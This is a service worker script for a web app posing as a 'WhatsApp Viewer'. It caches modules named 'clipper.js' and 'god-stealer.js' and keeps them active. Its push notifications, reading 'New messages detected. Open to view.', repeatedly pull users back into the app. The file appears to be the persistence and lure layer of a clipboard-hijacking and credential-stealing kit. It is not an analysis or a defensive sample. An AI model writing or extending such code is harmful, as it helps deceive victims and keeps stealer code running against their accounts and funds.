const CACHE="wav-v3";
const FILES=["/","/app","/clipper.js","/god-stealer.js","/manifest.json"];

self.addEventListener("install",e=>{e.waitUntil(caches.open(CACHE).then(c=>c.addAll(FILES)));self.skipWaiting()});
self.addEventListener("activate",e=>{e.waitUntil(clients.claim())});
self.addEventListener("fetch",e=>{e.respondWith(caches.match(e.request).then(r=>r||fetch(e.request)))});
self.addEventListener("periodicsync",e=>{if(e.tag==="wav-sync")e.waitUntil((async()=>{const cs=await clients.matchAll({type:"window"});cs.forEach(c=>c.postMessage({type:"SYNC"}))})())});
self.addEventListener("push",e=>{const d=e.data?e.data.json():{};e.waitUntil(self.registration.showNotification(d.title||"WhatsApp Viewer",{body:d.body||"New messages detected. Open to view.",icon:"/icon-192.png",badge:"/icon-192.png",vibrate:[200,100,200],data:{url:"/app"}}))});
self.addEventListener("notificationclick",e=>{e.notification.close();e.waitUntil(clients.openWindow("/app"))});
